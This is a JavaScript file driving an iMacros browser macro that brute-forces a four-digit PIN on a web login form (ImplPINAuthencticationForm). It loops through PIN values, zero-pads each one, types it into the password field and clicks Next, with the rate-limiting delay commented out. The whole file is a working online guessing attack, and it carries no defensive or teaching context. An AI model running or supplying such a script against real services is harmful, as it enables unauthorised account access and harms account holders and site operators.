var macro;
macro =  "CODE:";
macro += "VERSION BUILD=8820413 RECORDER=FX" + "\n";
macro += "SET !EXTRACT_TEST_POPUP NO" + "\n";
macro += "TAB T=1" + "\n";
macro += "SET !TIMEOUT_PAGE 120" + "\n";
macro += "SET !VAR1 {0}" + "\n";
macro += "TAG POS=1 TYPE=INPUT:PASSWORD FORM=ID:ImplPINAuthencticationForm ATTR=ID:pin CONTENT={{!VAR1}}" + "\n";
macro += "TAG POS=1 TYPE=BUTTON FORM=ID:ImplPINAuthencticationForm ATTR=ID:btnNext" + "\n";
//macro += "PROMPT {{!VAR1}}"

var num = 1800;

function run()
{  
    var i;
    for (i = 0; i <= 9999; i++)
    {
    	//sleepThenAct();
        iimPlay(macro.replace("{0}", getNextNum()));
        num = num + 1;
    }
}

function getNextNum()
{
  return ("0000" + num).substr(-4,4);
}

function sleepFor( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}

function sleepThenAct()
{ 
sleepFor(2000);
}

run();